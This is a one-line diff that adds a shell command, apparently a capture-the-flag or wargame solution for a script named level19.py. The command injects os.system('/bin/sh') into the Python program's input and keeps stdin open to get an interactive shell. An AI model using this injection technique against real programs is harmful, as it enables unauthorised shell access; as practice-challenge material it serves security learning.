@@ -1,0 +1,1 @@
+(echo "os.system('/bin/sh')" ; cat )| python3 ./level19.py
